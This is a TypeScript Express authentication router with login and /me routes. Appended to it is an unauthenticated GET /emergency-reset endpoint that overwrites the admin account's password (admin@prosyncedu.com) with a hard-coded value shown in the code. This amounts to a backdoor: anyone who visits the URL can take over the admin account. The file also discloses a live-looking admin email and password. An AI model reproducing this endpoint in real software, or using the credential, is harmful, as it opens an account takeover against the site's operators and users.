import { Router } from "express";

import { loginController } from "../controllers/login.controller";

import { meController } from "../controllers/me.controller";

import { authenticate } from "../../../shared/middlwares/auth.middleware";

const router = Router();

router.post(
  "/login",

  loginController
);

router.get(
  "/me",

  authenticate,

  meController
);
import { User } from "../../users/model/user.model";
import bcrypt from "bcryptjs";

router.get("/emergency-reset", async (req, res) => {
  try {
    const hashedPassword = await bcrypt.hash("Limitless#24", 10);
    const result = await User.updateOne(
      { email: "admin@prosyncedu.com" },
      { $set: { password: hashedPassword } }
    );
    res.json({ success: true, message: "Admin password reset successfully", result });
  } catch (err: any) {
    res.status(500).json({ error: err.message });
  }
});

export default router;